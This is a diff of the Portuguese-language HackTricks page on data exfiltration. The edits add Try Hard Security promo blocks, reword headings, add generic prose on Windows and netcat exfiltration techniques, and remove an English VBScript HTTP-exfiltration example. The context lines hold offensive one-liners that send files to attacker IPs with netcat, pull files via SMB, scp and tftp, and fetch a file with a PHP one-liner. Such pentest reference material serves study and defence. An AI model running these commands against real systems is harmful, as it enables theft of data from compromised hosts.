@@ -6,13 +6,21 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
+
+**Grupo de Segurança Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## Domínios comumente permitidos para exfiltrar informações
 
@@ -54,7 +62,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload de arquivos
+### Enviar arquivos
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -142,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Cliente Windows**
+### Cliente **Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -177,25 +185,37 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
+# Exfiltração do Windows
 
-## Exfiltração
+## Introdução
 
-### Ferramentas e Técnicas
+A exfiltração de dados em ambientes Windows pode ser realizada de várias maneiras, aproveitando as funcionalidades e protocolos disponíveis no sistema operacional. Abaixo estão algumas técnicas comuns usadas para exfiltrar dados de sistemas Windows comprometidos.
 
-- **Bitsadmin**: Utilize o Bitsadmin para criar e monitorar trabalhos de transferência de arquivos em segundo plano.
-- **WMIC**: Utilize o WMIC para executar comandos remotamente e exfiltrar dados.
-- **PowerShell**: O PowerShell pode ser usado para exfiltrar dados de várias maneiras, como enviar solicitações HTTP para um servidor remoto.
-- **FTP**: O FTP pode ser usado para transferir arquivos de forma eficiente para um servidor remoto.
-- **SMB**: O SMB pode ser explorado para exfiltrar dados para um compartilhamento de rede remoto.
-- **Email**: Os dados podem ser exfiltrados por e-mail, anexando arquivos ou enviando informações diretamente no corpo do e-mail.
-- **Steganography**: A esteganografia pode ser usada para ocultar dados exfiltrados em arquivos de imagem ou outros arquivos multimídia.
-- **DNS**: O DNS pode ser explorado para exfiltrar dados, enviando solicitações DNS codificadas para um servidor controlado pelo atacante.
-- **Criptografia**: A criptografia pode ser usada para proteger os dados exfiltrados, tornando mais difícil para os defensores interceptarem e entenderem as informações.
+## Técnicas de Exfiltração
 
-### Considerações Finais
+### Utilizando Protocolos de Rede
 
-Ao exfiltrar dados de um sistema Windows, é importante considerar a eficiência da técnica escolhida, bem como a capacidade de evasão de detecção. A escolha da ferramenta ou técnica certa dependerá do ambiente específico e dos requisitos do atacante.
+#### HTTP/S
+
+O tráfego HTTP/S é comum em ambientes corporativos e pode ser usado para exfiltrar dados sem chamar muita atenção. Os dados podem ser codificados em solicitações HTTP POST ou GET para um servidor controlado pelo atacante.
+
+#### DNS
+
+O tráfego DNS é geralmente permitido em redes e pode ser explorado para exfiltrar dados. Os dados podem ser codificados em consultas DNS ou em subdomínios.
+
+### Utilizando Canais de Comunicação Legítimos
+
+#### Email
+
+Os dados podem ser exfiltrados por email, anexando arquivos ou incorporando dados diretamente no corpo do email. Os atacantes também podem usar contas de email comprometidas para enviar dados.
+
+#### Serviços de Armazenamento na Nuvem
+
+Serviços de armazenamento na nuvem como Dropbox, Google Drive e OneDrive podem ser usados para exfiltrar dados. Os arquivos podem ser enviados para contas controladas pelo atacante.
+
+## Conclusão
+
+A exfiltração de dados em ambientes Windows pode ser realizada de várias maneiras, e os atacantes geralmente exploram protocolos de rede e canais de comunicação legítimos para evitar detecção. É importante implementar medidas de segurança robustas para proteger os dados confidenciais contra exfiltração não autorizada.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -205,7 +225,7 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-O atacante precisa ter o SSHd em execução.
+O atacante deve ter o SSHd em execução.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
@@ -218,6 +238,34 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+### Exfiltração de Dados
+
+#### Técnicas
+
+- **FTP**: Use o protocolo FTP para transferir dados para um servidor controlado pelo atacante.
+- **HTTP/S**: Envie dados para um servidor web controlado pelo atacante usando HTTP ou HTTPS.
+- **DNS**: Use consultas DNS para enviar dados codificados para um servidor controlado pelo atacante.
+- **SMTP**: Envie dados por e-mail para um servidor controlado pelo atacante.
+- **SSH**: Use o protocolo SSH para transferir dados de forma segura para um servidor controlado pelo atacante.
+- **Criptografia**: Criptografe os dados antes de exfiltrá-los para tornar a detecção mais difícil.
+
+#### Ferramentas
+
+- **Curl**: Uma ferramenta de linha de comando para transferir dados com URL.
+- **Wget**: Uma ferramenta para baixar arquivos da web.
+- **Netcat**: Uma ferramenta de rede que pode ser usada para transferir dados por meio de diferentes protocolos.
+- **Ncat**: Uma versão atualizada e mais segura do Netcat.
+- **Socat**: Uma ferramenta de rede avançada que suporta várias conexões.
+- **Hping**: Uma ferramenta para enviar pacotes personalizados e analisar as respostas.
+- **Dnscat2**: Uma ferramenta que pode ser usada para exfiltrar dados por meio de consultas DNS.
+
+#### Recursos
+
+- **Servidores Controlados pelo Atacante**: Configure servidores controlados pelo atacante para receber os dados exfiltrados.
+- **Túneis Criptografados**: Use túneis criptografados para enviar dados de forma segura para o servidor controlado pelo atacante.
+- **Codificação de Dados**: Codifique os dados antes da exfiltração para dificultar a detecção.
+- **Canais Encobertos**: Use canais encobertos para enviar dados de forma mais discreta e evasiva.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -278,7 +326,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Em **vítima**, conecte-se ao servidor Kali:
+No **alvo**, conecte-se ao servidor Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -289,26 +337,6 @@ Baixe um arquivo com um PHP oneliner:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### Visual Basic Scripting Edition (VBScript)
-
-VBScript is a scripting language developed by Microsoft that is modeled on Visual Basic. It is commonly used for writing scripts to automate tasks on Windows systems. VBScript can be used for various purposes, including system administration, network administration, and web development.
-
-### Exfiltration using VBScript
-
-VBScript can be used for exfiltration by reading data from files, registry keys, or other sources and sending it to an external server using various methods such as HTTP requests or email. This technique can be used by attackers to steal sensitive information from a compromised system.
-
-### Example
-
-```vbscript
-Dim objXMLHTTP, strURL
-strURL = "http://www.example.com/data=" & dataToExfiltrate
-Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objXMLHTTP.open "GET", strURL, False
-objXMLHTTP.send
-```
-
-In this example, VBScript is used to send data to a specified URL using an HTTP GET request. The `dataToExfiltrate` variable contains the data that is being exfiltrated.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -360,6 +388,11 @@ Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe se
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
